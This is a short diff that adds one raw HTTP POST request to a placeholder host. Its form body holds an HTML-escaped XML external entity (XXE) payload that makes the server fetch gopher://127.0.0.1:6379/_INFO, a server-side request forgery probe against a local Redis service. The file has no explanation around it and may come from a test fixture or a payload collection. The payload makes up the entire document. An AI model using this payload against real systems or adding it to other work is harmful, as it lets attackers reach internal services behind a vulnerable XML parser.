@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+Connection: close
+
+data=&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;gopher://127.0.0.1:6379/_INFO&quot;&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
